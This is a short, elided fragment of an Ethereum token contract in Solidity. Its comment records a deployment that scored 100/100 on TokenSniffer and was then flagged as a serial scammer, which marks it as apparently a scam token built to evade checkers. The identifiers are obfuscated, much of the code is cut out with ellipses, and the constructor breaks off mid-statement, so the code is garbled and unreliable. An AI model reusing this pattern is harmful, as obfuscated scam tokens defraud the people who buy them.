...
/*
  TEST - 0xA977Cec1529885B5Ed63689CBDb3FA8947FDB7dD
  TESTED - WORKING SO FAR
  ETH - 
  ETH TEST RESULT - DEPLOYED ONCE, 100/100 TOKENSNIFFER, WOKE UP AND IT WAS FLAGGED AS SERIAL SCAMMER
*/
...
contract HOW is IndexedUI02, Ownable {
    ...
    constructor(
        ...
        [address(this)] = _agapeRATE; BisectDiverse = FactoryResults02(passageStream);

        IPOXLinkOver = IDEXFactoryCraft(BisectDiverse.factory()).createPair
